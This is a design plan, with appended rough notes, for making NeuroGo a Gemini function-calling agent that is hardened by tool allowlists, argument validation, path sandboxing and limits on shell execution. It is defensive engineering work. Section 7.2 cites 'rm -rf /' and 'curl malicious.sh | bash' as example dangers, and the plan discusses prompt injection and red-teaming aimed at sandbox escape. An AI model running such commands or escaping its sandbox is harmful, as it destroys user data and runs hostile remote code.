| Context Window Limit      | Long conversation history exceeds LLM's processing capacity.                   | Loss of context, degraded performance, increased cost.               | Context summarization/truncation, Sliding window, Use large-context models.7                                                                          | 7                   |
| State Synchronization     | Ensuring consistent state management, especially with persistence/concurrency. | Data corruption, inconsistent agent behavior.                        | Careful state manager design, Atomic operations/locking if needed later.                                                                              |                     |
| Latency                   | Slow response times due to LLM calls, security checks, tool execution.         | Poor user experience.                                                | Optimize checks/tools, Faster LLM models 21, Caching, Potential parallelism (later).                                                                  | 29                  |
| Cost                      | LLM API usage incurs monetary costs based on token count.                      | Increased operational expenses.                                      | Prompt optimization, Context management, Cheaper models where feasible, Caching.                                                                      | 14                  |

Navigating these challenges requires acknowledging the inherent trade-offs, particularly between security and usability.29 Overly aggressive security might block legitimate use cases, while insufficient security invites disaster. Phased development and continuous testing are essential for finding the right balance. Furthermore, the intrinsic nature of prompt injection vulnerabilities in current LLMs 11 means that mitigation must focus on robust validation and containment within NeuroGo, rather than assuming the LLM's suggestions can ever be fully trusted.

## Section 6: Phased Development and Testing Milestones

A phased approach is recommended for developing NeuroGo-as-llm-agent, allowing for iterative development, testing, and refinement, particularly of the critical security components.14

### 6.1. Phase 1: Foundational Implementation (Focus: Core Loop & Basic Security)
*   Goals: Establish the fundamental communication pathway between the LLM (Gemini) and NeuroGo using function calling. Implement the basic agent loop, minimal state management, and foundational security checks for a small set of safe tools.
*   Tasks:
    *   Implement Gemini API client in llm.go capable of sending requests with function declarations and parsing FunctionCall/FunctionResponse.
    *   Develop the initial Conversation State Manager (in-memory storage is sufficient).
    *   Implement the Security Layer stub with basic Tool Allowlisting logic (reading from a simple config file).
    *   Select 1-2 inherently safe tools (e.g., TOOL.Echo, a read-only TOOL.ReadFile using a preliminary SecureFilePath). Implement basic argument validation (e.g., type checking) for these tools within the Security Layer.
    *   Implement basic agent mode configuration flags (API key, allowlist file path).
    *   Develop unit tests for the new state manager, LLM client interaction logic, and basic security checks.
*   Outcome: A working prototype demonstrating the core LLM -> NeuroGo -> Tool -> LLM loop via function calling for a very limited, safe toolset. Security is minimal but the framework is in place. This phase focuses on getting the mechanics right before tackling complex security for riskier tools.

### 6.2. Phase 2: Security Hardening and Tool Expansion (Focus: Robustness & Capability)
*   Goals: Implement the comprehensive security design outlined in Section 4. Expand the set of allowlisted tools, ensuring each is securely integrated. Refine configuration and state management.
*   Tasks:
    *   Implement full argument validation and sanitization logic within the Security Layer, covering various data types (paths, strings, URLs, potentially others) and common injection patterns.
    *   Mandate, implement, and rigorously test the SecureFilePath sandboxing mechanism. Refactor all relevant filesystem tools to use it exclusively when called by the LLM.
    *   Implement the high-risk tool restriction policy (e.g., ensuring TOOL.ExecuteCommand 13 is disabled by default for LLM context and requires explicit override).
    *   Implement input and output filtering mechanisms (Section 4.5).
    *   Expand the tool allowlist, carefully reviewing and refactoring each newly added tool for security compliance (sandboxing, context awareness).
    *   Develop comprehensive configuration options (sandbox root, security levels, specific tool toggles).
    *   Refine the Conversation State Manager (e.g., implement basic context window handling strategies).
    *   Develop integration tests covering various tool call scenarios, argument types, and security policy enforcement (e.g., testing sandbox boundaries, validation rules).
*   Outcome: A significantly more secure and capable agent. Core security features are implemented, a wider range of tools is available (but securely constrained), and the system is more configurable and robust.

### 6.3. Phase 3: Refinement and Advanced Features (Focus: Usability, Performance, Testing)
*   Goals: Enhance usability through better error handling, optimize performance, handle more complex conversational flows, conduct thorough security testing, and integrate with NeuroScript's bootstrapping objectives.
*   Tasks:
    *   Implement sophisticated error handling, providing clearer feedback to the LLM (and thus the user) when tool calls fail or security checks are triggered.
    *   Identify and address performance bottlenecks (latency reduction, cost optimization through caching or model selection).
    *   Investigate and potentially implement support for more complex interactions, such as multi-turn tool use sequences or handling parallel tool calls if deemed necessary and safe.
    *   Conduct Dedicated Security Testing:
        *   Penetration Testing: Engage internal or external resources to actively probe for vulnerabilities, focusing on bypassing argument validation, escaping the sandbox, and achieving successful prompt injection against tool execution.3
        *   Red Teaming: Simulate realistic adversarial attacks aiming to achieve specific malicious goals using the agent.3
        *   Fuzzing: Apply fuzz testing techniques to the argument validation, sanitization, and path resolution logic to uncover edge cases and potential bypasses.3
    *   Integrate the agent's capabilities with specific tasks identified in the NeuroScript self-development roadmap (Section 7).
    *   Finalize user and developer documentation.
*   Outcome: A production-ready agent, hardened against security threats through testing, reasonably performant, user-friendly, and demonstrably useful for its intended purpose, including advancing the project's bootstrapping goals.

This phased approach recognizes that security is an ongoing, iterative process.14 Building defenses in Phase 2 and then actively trying to break them in Phase 3 3 is crucial for achieving confidence in the agent's security posture.

## Section 7: Alignment with NeuroScript Bootstrapping Goal

The development of NeuroGo-as-llm-agent is not merely an auxiliary feature but appears to be a potentially foundational capability for achieving the NeuroScript project's stated goal of managing its own development lifecycle (as inferred from query context referencing the roadmap 30).

### 7.1. Enabling Self-Development Tasks
The agent architecture directly enables an LLM to orchestrate core software development activities by securely interacting with the local development environment via NeuroGo's tools. For NeuroScript to manage its own development, it needs mechanisms to:

*   Read its own source code (LLM requests TOOL.ReadFile).
*   Analyze and understand the code (LLM's inherent capability).
*   Propose modifications (LLM generates text/code).
*   Apply modifications to files (LLM requests TOOL.WriteFile).
*   Manage version control (LLM requests TOOL.GitCommit, TOOL.GitPush, etc.).
*   Build and test the code (LLM requests TOOL.GoBuild, TOOL.GoTest).

The NeuroGo-as-llm-agent provides the necessary, secure execution layer for these file system, version control, and build tool interactions.

### 7.2. Secure Orchestration Layer
Crucially, the agent acts as a secure bridge. While the LLM provides the high-level reasoning and planning for development tasks (e.g., "Refactor this module to improve efficiency" or "Implement the feature described in issue #123"), NeuroGo enforces strict security constraints on how these plans are translated into actions on the local system. This contrasts sharply with the extreme risk of allowing an LLM to directly generate and execute arbitrary shell commands (rm -rf /, curl malicious.sh | bash).17 The agent ensures that the LLM's requests are channeled through pre-defined, allowlisted TOOLs operating under the validation and sandboxing rules of the Security Layer. This enables controlled automation 17 â€“ leveraging the LLM's power without granting it dangerous, unchecked access.

### 7.3. Accelerating the Bootstrapping Roadmap
Given the need for secure local interaction, the NeuroGo-as-llm-agent capability is likely a prerequisite or, at minimum, a significant accelerator for the bootstrapping goal.30 Without a secure way for an AI system (orchestrated by an LLM) to interact with its own codebase and development tools, attempts at self-modification would be fraught with unacceptable security risks. This agent provides that secure foundation, allowing the project to leverage state-of-the-art LLMs for complex tasks like code generation, refactoring, and automated testing as part of its own development process. It transforms the abstract goal of "bootstrapping" into a series of concrete, albeit complex, tasks that can be orchestrated via the agent interface. Therefore, building this secure agent capability is likely a critical early step enabling subsequent, more ambitious bootstrapping milestones outlined in the NeuroScript roadmap.

## Conclusion

### Summary of Plan
This plan outlines a comprehensive approach to evolving NeuroGo into NeuroGo-as-llm-agent, a secure execution backend for LLM-requested tool functions. It proposes an architecture centered around separating LLM reasoning from NeuroGo's controlled execution, leveraging the Gemini API's function calling mechanism. Detailed implementation steps within the Go codebase are specified, alongside a phased development plan. Critically, the plan incorporates a multi-layered security design encompassing tool allowlisting, strict argument validation, mandatory path sandboxing, and restrictions on high-risk tools, designed to mitigate inherent risks like prompt injection and excessive agency.

### Emphasis on Security
The viability and trustworthiness of NeuroGo-as-llm-agent depend entirely on the rigorous implementation, continuous testing, and vigilant maintenance of the security measures detailed herein. The principle of treating all LLM-generated requests as untrusted input must guide every stage of development and deployment. Security cannot be an afterthought; it must be woven into the fabric of the agent's design and implementation from the outset.

### Next Steps
The recommended next step is to commence Phase 1 of the development plan. This involves establishing the basic communication loop with the Gemini API via function calling, implementing foundational state management, and integrating the initial security layer with allowlisting for a minimal set of safe tools. This will provide a functional prototype upon which the more comprehensive security hardening and feature expansion of subsequent phases can be built.# Notes: NeuroGo as LLM Agent Mechanism

## Section 8: Gemini 2.5 Discussion: LLM Interaction API (LLM -> NeuroGo Request)

* Goal: Allow LLM to request NeuroGo execute a TOOL during a conversation.
* Option A: Structured Chat Response:
    * LLM responds with text containing a predefined structure (e.g., JSON) indicating a TOOL call request (tool_name, arguments).
    * NeuroGo parses this structured part of the response.
    * Pros: Works with standard chat/completion APIs (like the current llm.go setup [cite: uploaded:neuroscript/pkg/core/llm.go]).
    * Cons: Requires careful prompt engineering for the LLM to reliably generate the correct structure; parsing logic in NeuroGo can be brittle.
* Option B: Function Calling / Tool Use API:
    * Modern LLM APIs (including Gemini) often have explicit support for this.
    * NeuroGo declares available TOOLs (name, description, parameters - like ToolSpec [cite: uploaded:neuroscript/pkg/core/tools_types.go]) to the LLM API.
    * When the LLM needs a tool, the API response itself is a structured object indicating the tool name and arguments to call.
    * NeuroGo receives this object, executes the tool, and sends the result back in the next API call.
    * Pros: Most robust, standard, designed for this purpose. Avoids parsing responses.
    * Cons: Requires modifying llm.go [cite: uploaded:neuroscript/pkg/core/llm.go] to use the specific function calling mode/parameters of the Gemini API.
* Option C: MCP (Multi-Context Prompting):
    * Less common in standard commercial APIs compared to function calling. Might be overly complex or not directly supported by the current Gemini endpoint.
* Recommendation: Prioritize Option B (Function Calling). It's the industry standard and most reliable way. If that proves difficult with the specific API endpoint, fall back to Option A (Structured Chat Response).

## 2. Conversation State Management

* Requirement: NeuroGo must maintain the history of the interaction across multiple turns (user prompt -> LLM response -> [LLM tool request -> NeuroGo tool execution -> tool result -> LLM continuation] -> final response).
* Implementation:
    * The logic managing the CALL LLM needs expansion.
    * It must store the sequence of messages (user, assistant, tool_request, tool_result).
    * For each call to the LLM API (especially after a tool result), the relevant history must be formatted and included according to the API requirements (e.g., the contents array for Gemini multi-turn chat, or the specific format for function calling responses).
    * This state management likely belongs within the Go code handling the LLM interaction (llm.go and potentially interpreter_simple_steps.go where CALL LLM is handled).

## 3. Security & Limiting Actions

* Requirement: Prevent the LLM from making NeuroGo execute arbitrary or harmful commands/actions. This is critical.
* Mechanisms:
    * Tool Allowlist: Explicitly define which TOOLs are available to be called by the LLM. Do not expose all registered tools [cite: uploaded:neuroscript/pkg/core/tools_registry.go] if not necessary. This might involve a separate registration or filtering layer for LLM-callable tools.
    * Strict Argument Validation: Enhance ValidateAndConvertArgs [cite: uploaded:neuroscript/pkg/core/tools_validation.go] or add further checks for arguments received from the LLM for tool calls. Pay extra attention to file paths, URLs, shell command arguments, etc. Check types, formats, and potentially value ranges or patterns.
    * Path Sandboxing: Consistently use SecureFilePath [cite: uploaded:neuroscript/pkg/core/tools_helpers.go] (or equivalent) for all filesystem operations requested via TOOLs (ReadFile, WriteFile, ListDirectory, GitAdd, etc. [cite: uploaded:neuroscript/pkg/core/tools_fs.go, uploaded:neuroscript/pkg/core/tools_git.go]) to ensure they stay within the allowed working directory.
    * Restrict/Disable Dangerous Tools: TOOL.ExecuteCommand [cite: uploaded:neuroscript/pkg/core/tools_shell.go] is high-risk. Consider:
        * Not exposing it to the LLM at all.
        * If required, creating a highly restricted version that only allows specific commands from a hardcoded allowlist and performs extreme sanitization on arguments.
    * Resource Limits: Implement timeouts for LLM API calls and potentially for the execution of tools called by the LLM.
    * Deny Direct NS Execution: The LLM should only be allowed to request registered TOOLs, not ask NeuroGo to execute arbitrary NeuroScript code strings it generates dynamically within the agent loop.
    * Prompt Guidance (Secondary): Instructing the LLM about disallowed actions is helpful but not sufficient for security. Hardcoded checks and limitations in NeuroGo are essential.
* Recommendation: Implement multiple layers: Tool allowlisting, strict validation, path sandboxing, and heavy restrictions (or disabling) of ExecuteCommand. Security needs careful design.
